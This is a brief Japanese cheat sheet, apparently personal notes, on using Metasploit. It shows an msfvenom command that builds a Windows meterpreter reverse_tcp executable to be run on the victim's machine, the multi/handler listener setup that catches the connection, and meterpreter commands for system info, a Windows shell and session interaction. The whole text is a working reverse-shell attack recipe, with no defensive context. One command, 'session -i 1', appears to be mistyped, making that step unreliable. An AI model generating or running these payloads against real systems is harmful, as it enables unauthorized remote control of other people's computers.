###  msfvenomで相手側で実行する用のリバースシェルを生成する  
``` msfvenom -p windows/meterpreter/reverse_tcp LHOST=<自分のIP> LPORT=1111 -f exe -o sheshe.exe ```  

### msfvenomでリバースシェルの待ち構え  
```
msf > use exploit/multi/handler  
msf > set PAYLOAD windows/meterpreter/reverse_tcp
msf > set LHOST <自分のIP>  
msf > set LPORT ポート番号
msf > run
```

### システムの情報を表示する  
``` meterpreter> sysinfo ```

### windowsシェルの起動
``` meterpreter> shell ```

### exploitをしてsession 1 created in the backgroundとでる  
セッションに接続する  
``` session -i 1 ```
